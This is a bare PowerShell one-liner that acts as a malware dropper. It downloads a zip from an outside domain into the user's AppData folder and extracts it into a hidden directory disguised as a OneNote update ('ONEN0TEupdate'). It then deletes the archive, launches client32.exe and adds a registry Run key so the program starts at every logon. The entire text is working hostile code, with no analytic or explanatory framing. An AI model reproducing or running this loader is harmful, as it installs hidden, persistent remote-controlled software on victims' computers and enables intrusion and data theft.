cd $env:AppData; $link="https://eylulsifalitas.com/baot.zip"; $path=$env:APPDATA+"\tr.zip"; $pzip=$env:APPDATA+"\ONEN0TEupdate"; Start-BitsTransfer -Source $link -Destination $Path; expand-archive -path .\tr.zip -destinationpath $pzip; $FOLD=Get-Item $pzip -Force; $FOLD.attributes='Hidden'; Remove-Item -path $path; cd $pzip; start client32.exe; $fstr=$pzip+"\client32.exe"; New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "ONEN0TEupdate" -Value $fstr  -PropertyType "String";